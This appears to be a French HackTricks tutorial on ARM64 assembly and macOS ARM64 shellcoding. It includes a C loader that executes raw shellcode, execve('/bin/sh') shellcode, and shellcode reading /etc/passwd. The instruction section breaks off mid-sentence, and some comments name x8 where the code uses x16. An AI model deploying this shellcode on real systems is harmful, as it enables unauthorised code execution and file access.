# Introduction à ARM64

ARM64, également connu sous le nom d'ARMv8-A, est une architecture de processeur 64 bits utilisée dans différents types d'appareils, y compris les smartphones, les tablettes, les serveurs et même certains ordinateurs personnels haut de gamme (macOS). C'est un produit d'ARM Holdings, une entreprise connue pour ses conceptions de processeurs économes en énergie.

### Registres

ARM64 dispose de **31 registres généraux**, étiquetés `x0` à `x30`. Chacun peut stocker une valeur de **64 bits** (8 octets). Pour les opérations qui ne nécessitent que des valeurs de 32 bits, les mêmes registres peuvent être accessibles en mode 32 bits en utilisant les noms w0 à w30.

1. **`x0`** à **`x7`** - Ceux-ci sont généralement utilisés comme registres temporaires et pour passer des paramètres aux sous-routines.
   * **`x0`** transporte également les données de retour d'une fonction.
2. **`x8`** - Dans le noyau Linux, `x8` est utilisé comme numéro d'appel système pour l'instruction `svc`. **Dans macOS, c'est x16 qui est utilisé !**
3. **`x9`** à **`x15`** - Registres temporaires, souvent utilisés pour les variables locales.
4. **`x16`** et **`x17`** - Registres temporaires, également utilisés pour les appels de fonctions indirects et les stubs PLT (Procedure Linkage Table).
   * **`x16`** est utilisé comme **numéro d'appel système** pour l'instruction **`svc`**.
5. **`x18`** - Registre de plateforme. Sur certaines plates-formes, ce registre est réservé à des utilisations spécifiques à la plate-forme.
6. **`x19`** à **`x28`** - Ceux-ci sont des registres sauvegardés par l'appelé. Une fonction doit préserver les valeurs de ces registres pour son appelant.
7. **`x29`** - Pointeur de cadre.
8. **`x30`** - Registre de lien. Il contient l'adresse de retour lorsqu'une instruction `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) est exécutée.
9. **`sp`** - Pointeur de pile, utilisé pour suivre le sommet de la pile.
10. **`pc`** - Compteur de programme, qui pointe vers la prochaine instruction à exécuter.

### Convention d'appel

La convention d'appel ARM64 spécifie que les **huit premiers paramètres** d'une fonction sont passés dans les registres **`x0` à `x7`**. Les **paramètres supplémentaires** sont passés sur la **pile**. La **valeur de retour** est renvoyée dans le registre **`x0`**, ou dans **`x1`** également **s'il s'agit de 128 bits**. Les registres **`x19`** à **`x30`** et **`sp`** doivent être **préservés** lors des appels de fonction.

Lors de la lecture d'une fonction en assembleur, recherchez le **prologue et l'épilogue de la fonction**. Le **prologue** implique généralement **la sauvegarde du pointeur de cadre (`x29`)**, **la configuration** d'un **nouveau pointeur de cadre**, et **l'allocation d'espace de pile**. L'**épilogue** implique généralement **la restauration du pointeur de cadre sauvegardé** et le **retour** de la fonction.

### Instructions courantes

Les instructions ARM64 ont généralement le **format `opcode dst, src1, src2`**, où **`opcode`** est l'**opération** à effectuer (telle que `add`, `sub`, `mov`, etc.), **`dst`** est le registre de **destination** où le résultat sera stocké, et **`src1`** et **`src2`** sont les registres de **source**. Des valeurs immédiates peuvent également être utilisées à la place des registres source.

* **`mov`** : **Déplacer** une valeur d'un **registre** à un autre.
  * Exemple : `mov x0, x1` - Cela déplace la valeur de `x1` vers `x0`.
* **`ldr`** : **Charger** une valeur de la **mémoire** dans un **registre**.
  * Exemple : `ldr x0, [x1]` - Cela charge une valeur de l'emplacement mémoire pointé par `x1` dans `x0`.
* **`str`** : **Stocker** une valeur d'un **registre** dans la **mémoire**.
  * Exemple : `str x0, [x1]` - C
## macOS

### appels système

Consultez [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master).

### Shellcodes

Pour compiler :

{% code overflow="wrap" %}
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done
```
<details>

<summary>Code C pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);
 
    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();
 
    return 0;
}
```
</details>

#### Shell

Extrait de [**ici**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) et expliqué.

{% tabs %}
{% tab title="avec adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:    
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="avec pile" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    ; We are going to build the string "/bin/sh" and place it on the stack.
    
    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

    ; Prepare arguments for the execve syscall.
    
    mov  x1, #8       ; Set x1 to 8.
    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

    ; Make the syscall.
    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Lecture avec cat

Le but est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, donc le deuxième argument (x1) est un tableau de paramètres (ce qui signifie en mémoire une pile d'adresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the execve syscall
    sub sp, sp, #48        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, cat_path
    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
    adr x0, passwd_path    ; Get the address of "/etc/passwd"
    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
    
    adr x0, cat_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59            ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Appeler une commande avec sh depuis une fourchette pour que le processus principal ne soit pas tué
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the fork syscall
    mov x16, #2            ; Load the syscall number for fork (2) into x8
    svc 0                  ; Make the syscall
    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
    beq _loop              ; If not child process, loop

    ; Prepare the arguments for the execve syscall

    sub sp, sp, #64        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, sh_path
    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
    adr x0, sh_c_option    ; Get the address of "-c"
    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
    
    adr x0, sh_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


_exit:
    mov x16, #1            ; Load the syscall number for exit (1) into x8
    mov x0, #0             ; Set exit status code to 0
    svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
